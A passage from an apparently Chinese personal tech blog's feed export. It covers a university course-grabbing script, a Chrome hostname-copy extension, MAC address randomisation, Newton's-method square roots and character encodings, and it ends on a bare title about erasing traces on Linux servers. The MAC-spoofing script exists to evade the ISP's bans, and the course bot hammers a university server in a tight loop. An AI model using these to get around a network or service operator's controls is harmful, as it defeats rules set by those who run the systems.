postData=&#123;<span class="string">'username'</span>:username,<span class="string">'password'</span>:password,<span class="string">'captcha'</span>:<span class="string">''</span>&#125;</span><br><span class="line">    postData=json.dumps(postData,separators=(<span class="string">','</span>,<span class="string">':'</span>)).encode(encoding=<span class="string">'utf-8'</span>) <span class="comment">#将密码用户名转换为JSON</span></span><br><span class="line">    </span><br><span class="line">    header=&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/json'</span>&#125;</span><br><span class="line">    opener.open(request.Request(<span class="string">"http://jxglstu.hfut.edu.cn/eams5-student/login"</span>, headers=header),postData) <span class="comment">#必须自己构造一个Request, 不然因为没有Content-Type会被自动替换成Urlencode</span></span><br><span class="line">   </span><br><span class="line">    cookie=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> cookieData <span class="keyword">in</span> aCookieJar:</span><br><span class="line">        cookie=cookie+cookieData.name+<span class="string">'='</span>+cookieData.value+<span class="string">';'</span> <span class="comment">#构造cookie</span></span><br><span class="line"> </span><br><span class="line">    cookie=cookie[<span class="number">0</span>:len(cookie)<span class="number">-1</span>] <span class="comment">#删掉最后一个;号</span></span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">opener=getOpener(getCookie(YourUsername,YourPassword))</span><br><span class="line">request.install_opener(opener) <span class="comment">#替代request的opener</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:   </span><br><span class="line">    <span class="keyword">for</span> courseNumber <span class="keyword">in</span> courseList:</span><br><span class="line">        print(<span class="string">'Now in '</span>,courseNumber)</span><br><span class="line">        charge(getRequestID(courseNumber))</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>开发一个简单的 Chrome 拓展</title>
    <url>/2018/06/14/%E5%BC%80%E5%8F%91%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%20Chrome%20%E6%8B%93%E5%B1%95/</url>
    <content><![CDATA[<p>每次复制域名时都会被 Chrome 复制地址时的 <code>https://</code> 烦到, 所以干脆自己写个拓展来解决这个问题. Chrome 拓展其实就是一个小网页, 也就是 HTML, 所以我们可以用 JavaScript 来实现获取域名和复制的操作. 具体实现如下.</p>
<a id="more"></a>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">tab</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> url = tab.url;</span><br><span class="line">    <span class="keyword">let</span> parser = <span class="built_in">document</span>.getElementById(<span class="string">"parser"</span>);</span><br><span class="line">    parser.href = url;</span><br><span class="line">    <span class="keyword">let</span> hostname = parser.hostname;</span><br><span class="line">    <span class="keyword">let</span> text = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>);</span><br><span class="line">    text.setAttribute(<span class="string">"value"</span>, hostname);</span><br><span class="line">    text.select();</span><br><span class="line">    <span class="built_in">document</span>.execCommand(<span class="string">"copy"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHostName</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    chrome.tabs.query(&#123;</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        windowId: chrome.windows.WINDOW_ID_CURRENT</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">tabs</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (tabs &amp;&amp; tabs[<span class="number">0</span>]) &#123;</span><br><span class="line">            callback(tabs[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = getHostName</span><br></pre></td></tr></table></figure>

<p>通过 <code>window.onload</code> 加载函数, 在 popup (地址栏右边的小图标点击后的页面) 弹出时自动将域名复制到粘贴版上. 关于获得当前页面 <code>url</code>, 因为 popup 自己就是个单独的页面, 与使用者当前浏览的隔离, 所以不能通过 <code>chrome.tabs.getCurrent</code> 来获得, 最后在 <a href="https://segmentfault.com/q/1010000005570850/a-1020000005590533" target="_blank" rel="noopener">segmentfault</a> 上找到了大神的答案, 通过 <code>query</code> 函数来得到当前页面的 url, 然后调用 callback 函数. 接下来就是从 url 中解析得到 hostname 也就是域名, 不过 JavaScript 并没有现成的函数, 我们也没必要因为此就直接加载个第三方库, 所以我们可以设置 DOM 的 href 属性后通过 hostname 属性间接得到域名 (不知道为什么 JavaScript 不直接搞个函数算了233), 然后通过 <code>document.execCommand</code> 来复制 select 中的域名即可. 接下来就是 <code>manifest.json</code>, 不过有完整的文档, 弄起来比较容易  </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"Get-hostname"</span>,</span><br><span class="line">      <span class="attr">"version"</span>: <span class="string">"1.0"</span>,</span><br><span class="line">      <span class="attr">"manifest_version"</span>: <span class="number">2</span>,</span><br><span class="line">      <span class="attr">"description"</span>: <span class="string">"Get hostname of current website."</span>,</span><br><span class="line">      <span class="attr">"icons"</span>: &#123;</span><br><span class="line">           <span class="attr">"16"</span>: <span class="string">"icon16.png"</span>,</span><br><span class="line">           <span class="attr">"48"</span>: <span class="string">"icon48.png"</span>,</span><br><span class="line">           <span class="attr">"128"</span>: <span class="string">"icon128.png"</span> </span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="attr">"browser_action"</span>: &#123;</span><br><span class="line">          <span class="attr">"default_icon"</span>: <span class="string">"icon48.png"</span>,</span><br><span class="line">          <span class="attr">"default_popup"</span>: <span class="string">"main.html"</span></span><br><span class="line">        &#125;,</span><br><span class="line">      <span class="attr">"content_security_policy"</span>: <span class="string">"policyString"</span>,</span><br><span class="line">      <span class="attr">"incognito"</span>: <span class="string">"spanning"</span>,</span><br><span class="line">      <span class="attr">"key"</span>: <span class="string">"publicKey"</span>,</span><br><span class="line">      <span class="attr">"offline_enabled"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"permissions"</span>: [<span class="string">"tabs"</span>]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后加上 <code>main.html</code> 和 <code>CSS</code> 来装饰下就完美了.<br>PS: CSS 来自 <a href="http://www.bootcss.com/p/buttons/" target="_blank" rel="noopener">button</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"parser"</span> <span class="attr">type</span>=<span class="string">"hidden"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"main.css"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.text</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#666</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#EEE</span>;</span><br><span class="line">    <span class="attribute">border-color</span>: <span class="number">#EEE</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">300</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">"Helvetica Neue Light"</span>, <span class="string">"Helvetica Neue"</span>, Helvetica, Arial, <span class="string">"Lucida Grande"</span>, sans-serif;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">240</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">appearance</span>: none;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">    <span class="attribute">border</span>: none;</span><br><span class="line">    <span class="attribute">margin-left</span>: auto; </span><br><span class="line">    <span class="attribute">margin-right</span>: auto;</span><br><span class="line">    <span class="attribute">-webkit-box-sizing</span>: border-box;</span><br><span class="line">       <span class="attribute">-moz-box-sizing</span>: border-box;</span><br><span class="line">            <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">    <span class="attribute">-webkit-transition-property</span>: all;</span><br><span class="line">            <span class="attribute">transition-property</span>: all;</span><br><span class="line">    <span class="attribute">-webkit-transition-duration</span>: .<span class="number">3s</span>;</span><br><span class="line">            <span class="attribute">transition-duration</span>: .<span class="number">3s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后效果如下<br><img src="https://i.loli.net/2019/03/08/5c82677b223c6.jpg" alt=""><br>点开那个图标后当前域名就直接复制到剪贴板了, 终于可以摆脱该死的 <code>https://</code> 了.</p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>方便的更换网卡的 MAC 地址</title>
    <url>/2018/05/18/%E6%96%B9%E4%BE%BF%E7%9A%84%E6%9B%B4%E6%8D%A2%E7%BD%91%E5%8D%A1%E7%9A%84%20MAC%20%E5%9C%B0%E5%9D%80/</url>
    <content><![CDATA[<p>因为校园网的关系, 电信会定期封禁长时间在线的 MAC 地址, 这时候只要更换 MAC 地址就行了. 之前一直用的重启就可以随机生成 MAC 地址, 但是我现在用的这个版本的 LEDE 不知道为什么不会自动随机生成 MAC 地址了. 上网也没有找到有用的信息, 自己稍微试了下 ip 指令, 十分强大,</p>
<a id="more"></a>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ip link <span class="built_in">set</span> eth0.2 address xx:xx:xx:xx:xx:xx</span><br></pre></td></tr></table></figure>

<p>这样就可以设置任意 MAC 地址了, 十分方便. 也可以写个 python 小脚本一键生成随机 MAC 地址.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> run</span><br><span class="line"></span><br><span class="line">newAddr = <span class="string">"10:"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    i, j = randint(<span class="number">1</span>, <span class="number">15</span>), randint(<span class="number">1</span>, <span class="number">15</span>)</span><br><span class="line">    i, j = hex(i)[<span class="number">2</span>:], hex(j)[<span class="number">2</span>:]</span><br><span class="line">    newAddr += (i + j + <span class="string">":"</span>)</span><br><span class="line"></span><br><span class="line">newAddr = newAddr[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line">run([<span class="string">"ip"</span>, <span class="string">"link"</span>, <span class="string">"set"</span>, <span class="string">"eth0.2"</span>, <span class="string">"address"</span>, newAddr])</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>misc</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>牛顿迭代法求平方根</title>
    <url>/2018/01/31/%E7%89%9B%E9%A1%BF%E8%BF%AD%E4%BB%A3%E6%B3%95%E6%B1%82%E5%B9%B3%E6%96%B9%E6%A0%B9/</url>
    <content><![CDATA[<p>牛顿法可以求一些非线性方程的近似解.  而对于求平方根,  可以将 $y = \sqrt{x}$ 化成方程 $x^2 - a = 0$ 中求 $x$ 的值, $x$ 即为$a$ 的开根号, 根据牛顿法定义, 可以写出以下程序</p>
<a id="more"></a>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mysqrt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">double</span> input, <span class="keyword">double</span> approximation = <span class="number">1</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> iterations = <span class="number">8</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (input &lt; <span class="number">0</span> || approximation &lt;= <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"Input and approximation should bigger than zero."</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">double</span> y;</span><br><span class="line">	<span class="keyword">double</span> k;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iterations; ++i)</span><br><span class="line">	&#123;	</span><br><span class="line">		y = approximation * approximation - input;</span><br><span class="line">		k = <span class="number">2</span> * approximation;</span><br><span class="line">		approximation = -y / k + approximation;	</span><br><span class="line">		<span class="comment">//approximation = -(approximation * approximation - input) / (2 * approximation) + approximation;</span></span><br><span class="line">	&#125;</span><br><span class="line">        <span class="keyword">return</span> approximation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>画成图差不多这样, 是一个不断迭代, 精度越来越高的过程.<br><code>图已挂</code><br>实际运行的结果, 这是默认迭了8代的情况, 已经差不多已经到double类型的极限了.  </p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解字符编码</title>
    <url>/2019/08/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/</url>
    <content><![CDATA[<p>以前对 UTF-8, UTF-16, unicode, GBK, ASCII 之类的都是一知半解, 其实深入之后了解这些并不困难.  </p>
<a id="more"></a>

<h2 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h2><p>其实这是最简单的, unicode 就是一套标准, 把世界上每个存在的字符 (甚至包括 emoji) 都编一个号, 可以在 <a href="https://unicode-table.com/cn/" target="_blank" rel="noopener">https://unicode-table.com/cn/</a> 看到全部的编码,<br>把这个编的号, 一般叫做 code point, 也就是码点. 同时也设定了几个编码的标准, 也就是 UTF-8, UTF-16 等等, 毕竟直接把码点转二进制太浪费空间了.  </p>
<p>而这些编码, 就是把这些码点保存为计算机可以识别的二进制形式.  </p>
<h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>UTF-8 就是这些编码的一种, 详细可以参考<a href="https://zh.wikipedia.org/wiki/UTF-8" target="_blank" rel="noopener">维基百科</a>, 简单来说, 就是把码点转为二进制后,<br>然后为了节省空间, 把不同大小的码点转为不同长度的字节序列, 这就是他天才的地方, 用变长编码来节省长度.  </p>
<p>这里以 <code>啊</code> 为例, 它的码点是 <code>0x554a</code>, 在 <code>U+0800~U+FFFF</code> 的范围内, 二进制是 <code>0b101010101001010</code>,<br>那么根据定义, 他的保存方式是 <code>1110xxxx 10xxxxxx 10xxxxxx</code>, 我们将这个码点的二进制以大端的方式填入其中,<br>得到 <code>1110|0101 10|010101 10|001010</code>, 也就是 <code>b&#39;\xe5\x95\x8a&#39;</code>, 可以尝试在 python 解码, 得到的就是 <code>啊</code>.  </p>
<p>而在 <code>0x00 ~ 0xFF</code> 范围内, UTF-8 其实就被退化为 ASCII 了, 一是为了兼容性, 二是确实 ASCII 所涵盖的符号, 确实用的非常多.<br>这里可以手动写一些 UTF-8 的函数来加深学习, 因为是变长的, 所以来算长度, 以及截取相对比较麻烦.<br>这里用我用 c 写, 感觉非常的爽, 就像在高速公路上飙车, 控制不好就会翻车 (Segment fault) 233, 但是确实是最接近这些字符编码本来的样子.<br>没有了 python 上各种的包装.  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">read_file</span><span class="params">(<span class="keyword">char</span> *filename)</span> </span>&#123;</span><br><span class="line">    FILE *fd = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">    fseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> sz = ftell(fd);</span><br><span class="line">    fseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *content = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * sz);</span><br><span class="line">    fread(content, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), sz, fd);</span><br><span class="line"></span><br><span class="line">    fclose(fd);</span><br><span class="line">    <span class="keyword">return</span> content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8_strlen</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            length += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">codepoint_to_utf8</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> codepoint, <span class="keyword">int</span> *sz)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *s;</span><br><span class="line">    <span class="keyword">if</span> (codepoint &lt; <span class="number">0x80</span>) &#123;</span><br><span class="line">        *sz = <span class="number">1</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        *s = codepoint;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x800</span>) &#123;</span><br><span class="line">        *sz = <span class="number">2</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">2</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00011111</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (codepoint &lt; <span class="number">0x10000</span>) &#123;</span><br><span class="line">        *sz = <span class="number">3</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">3</span>);</span><br><span class="line">        *(s + <span class="number">2</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11100000</span> | ((codepoint &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0b00001111</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *sz = <span class="number">4</span>;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">4</span>);</span><br><span class="line">        *(s + <span class="number">3</span>) = <span class="number">0b10000000</span> | (codepoint &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">2</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *(s + <span class="number">1</span>) = <span class="number">0b10000000</span> | ((codepoint &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0b00111111</span>);</span><br><span class="line">        *s = <span class="number">0b11110000</span> | ((codepoint &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0b00000111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_tail_length</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((c &amp; <span class="number">0b11111000</span>) == <span class="number">0b11110000</span>) &#123;</span><br><span class="line">        length = <span class="number">3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((c &amp; <span class="number">0b11110000</span>) == <span class="number">0b11100000</span>) &#123;</span><br><span class="line">        length = <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((c &amp; <span class="number">0b11100000</span>) == <span class="number">0b11000000</span>) &#123;</span><br><span class="line">        length = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">utf8_substr</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> curr_pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> byte_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *new_s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (curr_pos &lt; start &amp;&amp; *s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            curr_pos += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s += (get_tail_length(*s) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curr_pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (curr_pos &lt; length &amp;&amp; *s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            curr_pos += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s++;</span><br><span class="line">        byte_count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (curr_pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        offset = get_tail_length(*(s - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        new_s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (byte_count + offset + <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(new_s, s - byte_count, byte_count + offset);</span><br><span class="line">        new_s[byte_count + offset] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        new_s = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> new_s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8_to_codepoint</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> codepoint = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*s &amp; <span class="number">0b11111000</span>) == <span class="number">0b11110000</span>) &#123;</span><br><span class="line">        length = <span class="number">4</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*s &amp; <span class="number">0b11110000</span>) == <span class="number">0b11100000</span>) &#123;</span><br><span class="line">        length = <span class="number">3</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b1111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*s &amp; <span class="number">0b11100000</span>) == <span class="number">0b11000000</span>) &#123;</span><br><span class="line">        length = <span class="number">2</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b11111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        length = <span class="number">1</span>;</span><br><span class="line">        codepoint = *s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        s++;</span><br><span class="line">        codepoint &lt;&lt;= <span class="number">6</span>;</span><br><span class="line">        codepoint = codepoint | (*s &amp; <span class="number">0b00111111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> codepoint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    char *content = read_file("/home/rmb122/temp/example.txt");</span></span><br><span class="line"><span class="comment">    printf("%d", utf8_strlen(content));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    free(content);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, utf8_strlen(<span class="string">"一二三四五六一二三四五六1234"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *s;</span><br><span class="line">    <span class="keyword">int</span> sz;</span><br><span class="line"></span><br><span class="line">    s = codepoint_to_utf8(<span class="number">21834</span>, &amp;sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.*s\n"</span>, sz, s);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line"></span><br><span class="line">    s = utf8_substr(<span class="string">"一2三四5六7八9"</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, utf8_to_codepoint(<span class="string">"五"</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h2><p>说实话, 我觉得 UTF-16 已经可以被扔进历史的垃圾桶, 然而 <code>Windows</code> 还依然使用 233.<br>他本身是为了保证固定长度而设计的, 因为两个字节 256*256, 可以表示 65536 种字符,<br>在以前 unicode 收录字符比较少的情况下是完全够的, 这样每个字符都保存为两个字节长,<br>可以节省运算, 虽然浪费了挺多的空间, 但是确实很方便.  </p>
<p>然而现在上面的网站上看到,  unicode 收录的字符早已超过了 65536 个, 也就意味着码点超过了 <code>0xFFFF</code>.<br>这里以 <code>𐎠</code> 这个字符为例  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"啊"</span>.encode(<span class="string">'utf-16be'</span>)</span><br><span class="line"><span class="string">b'UJ'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"𐎠"</span>.encode(<span class="string">'utf-16be'</span>)</span><br><span class="line"><span class="string">b'\xd8\x00\xdf\xa0'</span></span><br></pre></td></tr></table></figure>
<p>可以看到, 实际上保存这个字符用了 4 个字节. 历史的发展使得 UTF-16 唯一的好处已经荡然无存.<br>而且为了保存大端小端的额外信息, 还用了 <code>BOM</code> 这种丑陋的设计, 希望 <code>Windows</code> 也能早点淘汰掉 UTF-16 把 233</p>
<h2 id="GBK"><a href="#GBK" class="headerlink" title="GBK"></a>GBK</h2><p>这个是我国自创的编码标准, 优点非常明显, 节省空间, 相当于缩小版的 UTF-8 (当然用的码点表和具体实现跟 unicode 不同),<br>因为它只需要表达 ASCII + 汉字的字符空间就够了. 当然缺点也非常明显, 不能表达 ASCII + 汉字之外的字符, 也就注定只能在中国使用,<br>无法国际化, 而且实际上很多国家都有一套自创字符集, 这更促进了 unicode 的诞生. </p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试时给 Linux 服务器擦除痕迹的操作总结</title>
